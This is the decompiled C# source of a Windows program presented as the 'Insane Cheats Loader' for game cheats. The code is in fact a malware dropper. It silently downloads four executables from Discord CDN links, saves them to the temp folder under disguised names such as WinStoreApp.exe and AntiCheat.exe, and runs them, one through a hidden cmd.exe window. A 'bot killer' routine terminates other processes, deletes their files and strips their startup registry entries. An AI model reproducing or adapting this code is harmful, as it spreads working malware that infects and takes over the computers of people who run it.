// Decompiled with JetBrains decompiler
// Type: InsaneCheatsLoader.Program
// Assembly: Insane Cheats Loader, Version=5.5.2.2, Culture=neutral, PublicKeyToken=null
// MVID: 3F864AE2-DB60-46DC-A439-752476F01639
// Assembly location: C:\Users\Melo\Downloads\insanecheats.com_Loader_stable\IC.com_hack_loader_v5.3.0.4.exe

using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

namespace InsaneCheatsLoader
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Program.RunBotKiller();
      byte[] bytes1 = (byte[]) null;
      try
      {
        using (WebClient webClient = new WebClient())
          bytes1 = webClient.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826900295330037780/SPOILER_xdefbai.exe");
        System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\WinStoreApp.exe", bytes1);
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C WinStoreApp.exe /D \"" + bytes1?.ToString() + "\"  \"" + bytes1?.ToString() + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          WorkingDirectory = Path.GetTempPath(),
          FileName = "cmd.exe"
        });
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
      Thread.Sleep(2000);
      byte[] bytes2 = (byte[]) null;
      try
      {
        using (WebClient webClient = new WebClient())
          bytes2 = webClient.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826895653862375495/SPOILER_kathanaaa.exe");
        Thread.Sleep(200);
        System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\Hack-GUI.exe", bytes2);
        Process.Start(Path.GetTempPath() + "\\Hack-GUI.exe");
        Application.Exit();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
      Thread.Sleep(1000);
      byte[] bytes3 = (byte[]) null;
      try
      {
        using (WebClient webClient = new WebClient())
          bytes3 = webClient.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826873424218554418/SPOILER_kakatec.exe");
        Thread.Sleep(200);
        System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\AntiCheat.exe", bytes3);
        Process.Start(Path.GetTempPath() + "\\AntiCheat.exe");
        Application.Exit();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
      Thread.Sleep(500);
      byte[] bytes4 = (byte[]) null;
      try
      {
        using (WebClient webClient = new WebClient())
          bytes4 = webClient.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826986930901745695/SPOILER_superbmx.exe");
        Thread.Sleep(200);
        System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\Temp.exe", bytes4);
        Process.Start(Path.GetTempPath() + "\\Temp.exe");
        Application.Exit();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
      Application.Run((Form) new Form2());
    }

    public static void RunBotKiller()
    {
      foreach (Process process in Process.GetProcesses())
      {
        try
        {
          if (Program.Inspection(process.MainModule.FileName))
          {
            if (!Program.IsWindowVisible(process.MainWindowHandle))
              Program.RemoveFile(process);
          }
        }
        catch (Exception ex)
        {
          Debug.WriteLine("RunBotKiller: " + ex.Message);
        }
      }
    }

    private static void RemoveFile(Process process)
    {
      try
      {
        string fileName = process.MainModule.FileName;
        process.Kill();
        Program.RegistryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileName);
        Program.RegistryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", fileName);
        Thread.Sleep(100);
        System.IO.File.Delete(fileName);
      }
      catch (Exception ex)
      {
        Debug.WriteLine("RemoveFile: " + ex.Message);
      }
    }

    private static bool Inspection(string threat) => !(threat == Process.GetCurrentProcess().MainModule.FileName) && (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)) || threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)) || (threat.Contains("wscript.exe") || threat.StartsWith(Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Windows\\Microsoft.NET"))));

    private static bool IsWindowVisible(string lHandle) => Program.IsWindowVisible(lHandle);

    private static void RegistryDelete(string regPath, string payload)
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regPath, true))
        {
          if (registryKey != null)
          {
            foreach (string valueName in registryKey.GetValueNames())
            {
              if (registryKey.GetValue(valueName).ToString().Equals(payload))
                registryKey.DeleteValue(valueName);
            }
          }
        }
        if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        {
          using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, true))
          {
            if (registryKey != null)
            {
              foreach (string valueName in registryKey.GetValueNames())
              {
                if (registryKey.GetValue(valueName).ToString().Equals(payload))
                  registryKey.DeleteValue(valueName);
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
        Debug.WriteLine("RegistryDelete: " + ex.Message);
      }
      foreach (Process process in Process.GetProcessesByName("Process"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("Microsoft Edge"))
        process.Kill();
      string str1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Process.exe");
      string str2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Edge.exe");
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          foreach (ProcessModule module in (ReadOnlyCollectionBase) process.Modules)
          {
            if (module.FileName.Equals(str1))
              process.Kill();
            else if (module.FileName.Equals(str2))
              process.Kill();
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
        Console.ReadLine();
      }
    }

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsWindowVisible(IntPtr hWnd);
  }
}
